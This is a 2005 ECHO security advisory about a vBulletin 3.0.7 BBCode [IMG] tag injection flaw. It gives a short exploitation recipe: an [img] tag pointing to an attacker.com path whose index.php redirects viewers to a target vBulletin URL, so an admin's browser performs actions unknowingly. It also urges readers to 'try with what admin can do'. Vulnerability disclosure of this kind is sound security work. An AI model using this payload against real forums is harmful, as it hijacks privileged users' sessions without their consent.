@@ -1,0 +1,93 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+    .OR.ID
+ECHO_ADV_23$2005
+
+---------------------------------------------------------------------------
+           vBulletin BBCode IMG Tag Script Injection Vulnerability
+---------------------------------------------------------------------------
+
+Author: y3dips
+Date: August, 20th 2005
+Location: Indonesia, Jakarta
+Web: http://echo.or.id/adv/adv23-y3dips-2005.txt
+
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Version: vbulletin 3.0.7
+url : http://www.vbulletin.com/
+Description: 
+
+vBulletin (sometimes abbreviated vB) is a commercial Internet forum package 
+produced by Jelsoft Enterprises. It is often used to run larger boards and 
+discussion communities. Written in PHP with a MySQL database backend, it is 
+comparable to other forum software such as phpBB and UBB.threads.
+
+
+---------------------------------------------------------------------------
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~~
+
+The issue is due to a failure of the application to properly sanitize 
+user-supplied input in bbcode '[IMG]' tags included in a message 
+
+Successful exploitation of this vulnerability could permit the injection 
+of arbitrary HTML or script code into the browser of an unsuspecting user 
+in the context of the affected site.
+
+Exploitation
+~~~~~~~~~~~~~
+
+just post a message that include
+
+[img]http://attacker.com/yuckfou.png[/img]
+
+yuckfou.png is a folder , and include some "index.php" file
+
+---- index.php ----
+
+<?php
+header("Location: http://target.com/vbulletin/[something]"); 
+?>
+
+---- eof ------
+
+so , the user with its priveldeges will be automatically redirect to 
+the link (also with browser support). Next, be creative 
+(it works for non re-authenticate page) , try with what admin can do ;P
+
+THATS all
+
+FIX
+~~~~
+
+Vendor already contacted but still no responses
+
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~~~~~
+
+~ m0by, the_day, comex, z3r0byt3, K-159, c-a-s-e, S`to, lirva32, anonymous
+~ waraxe , LINUX, Heintz , slimjim100 , lunix, easyex all member of waraxe
+~ newbie_hacker@yahoogroups.com ,
+~ #e-c-h-o & #aikmel @DALNET
+
+--------------------------------------------------------------------------
+Contact:
+~~~~~~~~
+
+     y3dips || echo|staff || y3dips[at]gmail[dot]com
+     Homepage: http://y3dips.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
